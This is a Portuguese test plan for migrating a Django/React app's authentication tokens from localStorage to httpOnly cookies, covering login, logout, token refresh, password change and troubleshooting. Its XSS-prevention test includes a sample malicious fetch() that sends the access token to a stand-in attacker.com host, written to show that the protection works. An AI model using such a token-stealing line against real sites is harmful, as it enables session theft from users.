# MIGRAÇÃO PARA HTTPONLIE COOKIES - ROTEIRO DE TESTES

**Data**: 2 de março de 2026  
**Status**: Implementação completa  
**Próximo**: Testes de funcionalidade

---

## 📋 Checklist de Verificação

### Backend (Django)

- [x] `login_with_cpf()` retorna tokens em httpOnly cookies
- [x] `login_with_cnpj()` retorna tokens em httpOnly cookies
- [x] `logout_view()` remove cookies de autenticação
- [x] `refresh_token_view()` renova access_token
- [x] URL `/api/token/refresh/` configurada em config/urls.py
- [x] Removida duplicação de `logout_view()`

### Frontend (React)

- [x] `api.js` com `withCredentials: true`
- [x] Auto-refresh de token no interceptador
- [x] Removido armazenamento de tokens em localStorage
- [x] Login/index.jsx simplificado
- [x] ChangePassword usa endpoint correto `/auth/change-password/`
- [x] PrivateRoute verifica apenas dados de usuário
- [x] Reports/index.jsx sem verificação de expiração
- [x] Amostras/index.jsx usa api.js automaticamente
- [x] Header/index.jsx chama `/auth/logout/`
- [x] AdminPanel/index.jsx usa endpoints `/auth/...`
- [x] ReportsCard/index.jsx usa api.js para downloads
- [x] useAuth.js simplificado

---

## 🧪 Teste 1: Login com CPF

### Frontend

```javascript
1. Ir para http://localhost:3000/login
2. Inserir CPF: 12345678901
3. Senha: senha123
4. Clicar em "Login"
```

### Backend Esperado

```
[02/Mar/2026 14:50:00] "POST /api/auth/login/cpf/ HTTP/1.1" 200
```

### DevTools Expected (F12 > Application > Cookies)

```
Name: access_token
- Value: eyJ0eXAiOiJKV1QiLCJhbGc...
- HttpOnly: ✅ (checkmark)
- Secure: ✅ (em produção)
- SameSite: Lax

Name: refresh_token
- Value: eyJ0eXAiOiJKV1QiLCJhbGc...
- HttpOnly: ✅
- Secure: ✅
- SameSite: Lax
```

### localStorage Esperado

```javascript
// NO CONSOLE (F12 > Console):
localStorage.getItem("access_token"); // null ✅
localStorage.getItem("user"); // {...dados do usuário...} ✅
```

---

## 🧪 Teste 2: Carregamento de Amostras

### Frontend

```javascript
1. Após login (se não estiver em /change-password)
2. Navegar para http://localhost:3000/reports
3. Clicar em propriedade > amostras
4. Deve carregar lista de amostras
```

### Backend Esperado

```
[02/Mar/2026 14:50:15] "GET /api/amostras/ HTTP/1.1" 200
[02/Mar/2026 14:50:15] "GET /api/propriedades/ HTTP/1.1" 200
```

### Erro Evitado

```
❌ "GET /api/propriedades/ HTTP/1.1" 401  ← NÃO DEVE aparecer mais
❌ "POST /api/token/refresh/ HTTP/1.1" 404  ← NÃO DEVE aparecer mais
```

---

## 🧪 Teste 3: Download de Laudo PDF

### Frontend

```javascript
1. Na página de Amostras
2. Clicar em "Baixar Laudo" para uma amostra
3. Arquivo PDF deve baixar automaticamente
```

### Backend Esperado

```
[02/Mar/2026 14:50:30] "GET /api/amostras/1/gerar_laudo/?... HTTP/1.1" 200
```

### Terminal Debug

```bash
# No terminal do backend, verificar se há erro de token:
# ❌ BAD:
# "Unauthorized" ou "401"

# ✅ GOOD:
# PDF gerado e retornado com sucesso
```

---

## 🧪 Teste 4: Troca de Senha

### Frontend

```javascript
1. Fazer login com usuário em "primeiro_acesso=True"
2. Deve redirecionar para /change-password
3. Inserir senha atual e nova senha
4. Clicar em "Definir Senha"
```

### Backend Esperado

```
[02/Mar/2026 14:50:45] "POST /api/auth/change-password/ HTTP/1.1" 200
[02/Mar/2026 14:50:45] "POST /api/auth/logout/ HTTP/1.1" 200
```

### Comportamento Esperado

```
1. Mensagem "Senha definida com sucesso!"
2. Redirecionamento para /login após 2 segundos
3. localStorage limpo (user removido)
4. Fazer login novamente com nova senha
```

---

## 🧪 Teste 5: Logout

### Frontend

```javascript
1. Estar logado em qualquer página
2. Clicar em "Sair" no header
3. Confirmar no diálogo
```

### Backend Esperado

```
[02/Mar/2026 14:51:00] "POST /api/auth/logout/ HTTP/1.1" 200
```

### Comportamento Esperado

```
1. Cookies removidos no navegador
2. localStorage limpo
3. Redirecionamento para /login
4. Navegar para /reports deve redirecionar para /login
```

---

## 🧪 Teste 6: Token Expiration & Auto-Refresh

### Como Simular Expiração

```javascript
// NO CONSOLE (após fazer login):
// Modificar o refresh_token para estar "expirado":
```

### Resultado Esperado (Auto-Refresh)

```
1. Usuário faz requisição normalmente
2. Backend retorna 401 (token expirado)
3. api.js interceptor tenta renovar via /token/refresh/
4. Se refresh falhar, redireciona para /login
5. Se refresh sucede, requisição original é repetida
```

---

## 🧪 Teste 7: XSS Prevention

### Verificar Proteção

```javascript
// NO CONSOLE (F12 > Console):
// Tentar acessar token via JavaScript:

// ❌ ANTES (localStorage):
localStorage.getItem("access_token"); // "eyJ0eXA..."  ← VULNERÁVEL

// ✅ DEPOIS (httpOnly cookies):
localStorage.getItem("access_token"); // null          ← PROTEGIDO
document.cookie; // vazio (JS não vê httpOnly)
```

### Simulação de XSS

```javascript
// Código malicioso NÃO consegue roubar token:
fetch(
  "https://attacker.com/steal?token=" + localStorage.getItem("access_token"),
);
// Envia: ?token=null   ← Token protegido!
```

---

## ✅ Checklist Final de Testes

- [ ] Login com CPF funciona
- [ ] Login com CNPJ funciona
- [ ] Cookies httpOnly aparecem em DevTools
- [ ] localStorage não contém tokens
- [ ] Amostras carregam sem erro 401
- [ ] Download de PDF funciona
- [ ] Troca de senha funciona
- [ ] Logout funciona e limpa cookies
- [ ] Auto-refresh de token funciona (se necessário)
- [ ] XSS não consegue roubar token
- [ ] Redirecionamento para login após expiração
- [ ] Admin panel funciona para usuários is_staff

---

## 🐛 Troubleshooting

### Erro: "404 Not Found: /api/auth/token/refresh/"

**Causa**: API.js está tentando chamar URL errada  
**Solução**: Verificar se api.js tem `/token/refresh/` (não `/auth/token/refresh/`)  
**Status**: ✅ CORRIGIDO

### Erro: "GET /api/propriedades/ HTTP/1.1" 401

**Causa**: Token não está sendo enviado nos cookies  
**Solução**: Verificar se backend está settando cookies corretamente  
**Debug**:

```bash
curl -v -X POST http://localhost:8000/api/auth/login/cpf/ \
  -H "Content-Type: application/json" \
  -d '{"cpf": "12345678901", "password": "senha123"}' \
  | grep -i "set-cookie"
```

### Erro: "Cors error" ao fazer login

**Causa**: CORS_ALLOW_CREDENTIALS não configurado  
**Solução**: Verificar config/settings.py:

```python
CORS_ALLOW_CREDENTIALS = True  # ← Deve estar True
```

### Erro: Token renovado mas requisição continua 401

**Causa**: api.js não está reenviando requisição original  
**Solução**: Verificar se `api(originalRequest)` está sendo feito no `.then` do refresh

---

## 📊 Resumo de Mudanças

### URLs Mapeadas

| Frontend           | Backend                      | Tipo |
| ------------------ | ---------------------------- | ---- |
| `/login/cpf`       | `/api/auth/login/cpf/`       | POST |
| `/login/cnpj`      | `/api/auth/login/cnpj/`      | POST |
| `/logout`          | `/api/auth/logout/`          | POST |
| `/refresh`         | `/api/token/refresh/`        | POST |
| `/change-password` | `/api/auth/change-password/` | POST |
| `/register`        | `/api/auth/register/`        | POST |

### Cookies Configurados

```python
response.set_cookie(
    key='access_token',
    value=token,
    httponly=True,      # ← JS não consegue acessar
    secure=not DEBUG,   # ← HTTPS em produção
    samesite='Strict',  # ← Previne CSRF
    max_age=3600        # ← 1 hora de validade
)
```

---

## 📚 Referências

- [MDN: HTTP Only Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [OWASP: Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Web_Storage_Security_Cheat_Sheet.html)
- [Django Security](https://docs.djangoproject.com/en/5.2/topics/security/#cross-site-request-forgery-protection)

---

**Próximos Passos**:

1. Executar todos os testes acima
2. Se houver erros, consultar seção Troubleshooting
3. Ao passar em todos, fazer merge para main
4. Testar em ambiente de staging antes de produção
